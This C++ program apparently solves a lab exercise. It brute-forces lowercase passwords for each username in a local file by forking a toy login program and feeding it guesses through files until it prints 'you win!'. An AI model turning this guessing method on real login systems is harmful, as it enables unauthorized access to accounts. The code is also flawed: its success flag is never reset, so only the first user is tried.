#include<vector>
#include<string>
#include<iostream>
#include<fstream>
#include<sys/types.h>
#include<sys/wait.h>
#include<unistd.h>
#include<fcntl.h>

using namespace std;

int main(){
  pid_t pid;
  vector<string> users;
  fstream userFile( "user" );
  string word;
  bool success = false;


  while( userFile >> word ){
    users.push_back( word );
    //dump salt and hash
    userFile >> word;
    userFile >> word;
  }

  userFile.close();

  for( auto username : users ){
    string password = "a";

    while( !success ){
      cout << "trying\t" << password << '\t' << username << '\t';

      switch( pid = fork() ){
      case -1:
        //fail
        cout << "fork failure" << endl;
        exit( 1 );
        break;

      case 0:
        //child
        {
        int in = open( "out", O_RDWR );
        int out = open( "in", O_RDWR );
        dup2( in, 0 );
        dup2( out, 1 );
        close( in );
        close( out );
        execl( "./main", NULL );
        }
     
      default:
        //parent
        {
        //try password
        ofstream outFile( "out", ios::trunc );
        ifstream inFile( "in" );
        string result;
        string prompt1;
        string prompt2;

        getline( inFile, prompt1 );
        if( prompt1 == "format error!" ){
          cout << "bad format?" << endl;
          exit( 1 );
        }
        outFile << username << endl;;
        getline( inFile, prompt2 );
        outFile << password << endl;;
        getline( inFile, result );

        if( result == "you win!" ){
          cout << "success" << '\n';
          success = true;
        } else if( result == "you lose!" ){
          cout << "failure" << '\n';
          //construct next password
          int idx = password.size() - 1;

          while( ( ++password[idx] ) == ( 'z' + 1 ) ){
            password[idx] = 'a';
            --idx;
            if( idx == -1 ){
              password = string( password.size() + 1, 'a' );
              break;
            }
          }
        } else {
          cout << "exception" << '\n';
          cout << "received\n" << prompt1 << '\n' << prompt2 << '\n' << result << endl;;
          exit( 1 );
        }

        }
      }
      kill( pid, SIGKILL );
      wait( NULL );
    }
    cout << username << '\t' << password << '\n';
  }

  return 0;
}

